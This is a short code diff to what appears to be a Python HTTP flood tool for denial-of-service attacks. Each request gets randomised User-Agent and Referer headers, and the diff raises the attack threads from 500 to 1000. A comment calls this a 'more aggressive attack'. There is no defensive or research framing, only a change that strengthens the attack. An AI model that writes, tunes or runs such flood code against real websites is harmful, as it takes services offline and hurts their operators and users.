@@ -66,7 +66,7 @@ def httpcall(url):
         request.add_header('User-Agent', random.choice(headers_useragents))
         request.add_header('Cache-Control', 'no-cache')
         request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-        request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
+        request.add_header('Referer', random.choice(headers_referers))
         request.add_header('Keep-Alive', str(random.randint(110,120)))
         request.add_header('Connection', 'keep-alive')
         request.add_header('Host', host)
@@ -129,7 +129,7 @@ if __name__ == '__main__':
         referer_list()
         
         # Increase number of threads for more aggressive attack
-        for i in range(500):
+        for i in range(1000):  # Increased to 1000 threads
             t = HTTPThread()
             t.daemon = True
             t.start()
